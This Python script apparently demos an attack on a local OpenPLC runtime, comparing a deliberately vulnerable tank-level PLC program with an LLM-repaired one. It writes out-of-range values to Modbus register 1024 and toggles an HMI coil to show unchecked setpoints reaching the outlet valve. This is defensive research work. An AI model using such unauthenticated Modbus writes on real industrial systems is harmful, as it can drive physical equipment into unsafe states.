"""Stage 5 demo: a Modbus attack on a real OpenPLC runtime, before and after
the LLM repair.

Scenario 01 (tank level). The outlet valve command %QW0 is copied from the
HMI setpoint register %MW0 without a range check. OpenPLC exposes
  %QW0  as holding register 0     (what the valve receives)
  %MW0  as holding register 1024  (what the HMI writes)
  %QX0.0 as coil 0 (inlet valve), %QX1.0 as coil 8 (HMI "auto" button)
so anyone on the network can write register 1024 and the coil.

Usage (OpenPLC running: see docs/11-stage5-openplc-demo.md):
  python demo/attack_demo.py                 # vulnerable vs LLM-repaired program
  python demo/attack_demo.py --fixed dataset/programs/01_tank_level_clean.st
"""
from __future__ import annotations

import argparse
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))
from modbus import ModbusClient  # noqa: E402
from openplc import OpenPLC  # noqa: E402

ROOT = Path(__file__).resolve().parent.parent
HR_VALVE_CMD = 0       # %QW0  outlet_cmd
HR_HMI_SETPOINT = 1024  # %MW0  hmi_valve_sp
COIL_INLET = 0         # %QX0.0 inlet_valve
COIL_HMI_AUTO = 8      # %QX1.0 hmi_auto

STEPS = [
    ("Operator sets outlet valve to 60 %", 60),
    ("Attacker writes 32767 to register 1024", 32767),
    ("Attacker writes -500 to register 1024", -500),
]


def run_scenario(host: str, port: int) -> list[tuple[str, int, int]]:
    rows = []
    with ModbusClient(host, port) as mb:
        for label, value in STEPS:
            mb.write_register(HR_HMI_SETPOINT, value)
            time.sleep(0.3)  # a few 20 ms scan cycles
            rows.append((label, value, mb.read_holding_registers(HR_VALVE_CMD)[0]))
        mb.write_coil(COIL_HMI_AUTO, True)
        time.sleep(0.3)
        rows.append(("Attacker 'presses' the HMI auto button (coil 8)", 1,
                     int(mb.read_coils(COIL_INLET)[0])))
        mb.write_coil(COIL_HMI_AUTO, False)
    return rows


def default_fixed() -> Path:
    repaired = sorted((ROOT / "results" / "repairs").glob("*/01_tank_level_fixed.st"))
    return repaired[0] if repaired else ROOT / "dataset/programs/01_tank_level_clean.st"


def main() -> int:
    ap = argparse.ArgumentParser(description=__doc__.splitlines()[0])
    ap.add_argument("--vuln", default=str(ROOT / "dataset/programs/01_tank_level_vuln.st"))
    ap.add_argument("--fixed", default=None, help="default: the LLM repair, else the clean twin")
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--modbus-port", type=int, default=502)
    ap.add_argument("--web", default="http://127.0.0.1:8080")
    args = ap.parse_args()
    fixed = Path(args.fixed) if args.fixed else default_fixed()

    plc = OpenPLC(args.web)
    results = {}
    for tag, path in (("vulnerable", Path(args.vuln)), ("fixed", fixed)):
        print(f"Deploying {tag} program {path.name} to OpenPLC ...", flush=True)
        plc.deploy(path.read_text(encoding="utf-8"), f"plcguard_{tag}")
        results[tag] = run_scenario(args.host, args.modbus_port)
    plc.stop()

    print(f"\nFixed program used: {fixed.relative_to(ROOT) if fixed.is_relative_to(ROOT) else fixed}\n")
    print(f"| Step | Written | Valve / coil (vulnerable) | Valve / coil (fixed) |")
    print("|---|---|---|---|")
    for (label, value, before), (_, _, after) in zip(results["vulnerable"], results["fixed"]):
        print(f"| {label} | {value} | {before} | {after} |")
    return 0


if __name__ == "__main__":
    sys.exit(main())
